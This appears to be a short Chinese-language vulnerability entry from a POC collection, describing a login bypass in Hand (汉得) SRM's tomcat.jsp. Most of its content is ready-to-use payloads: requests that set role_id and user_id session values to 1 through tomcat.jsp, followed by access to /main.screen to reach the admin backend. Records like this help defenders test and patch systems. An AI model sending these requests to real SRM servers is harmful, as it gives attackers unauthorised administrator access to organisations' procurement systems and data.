# 汉得SRM tomcat.jsp 登陆绕过漏洞

## 漏洞描述
汉得SRM tomcat.jsp 文件存在登陆绕过漏洞, 攻击者通过发送请求包，可以获取后台管理员权限

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登陆页面

![image-20230828164434474](images/image-20230828164434474.png)

验证POC (Tomcat session操控)

```
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```

## Payloads
```
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```
```
/main.screen
```
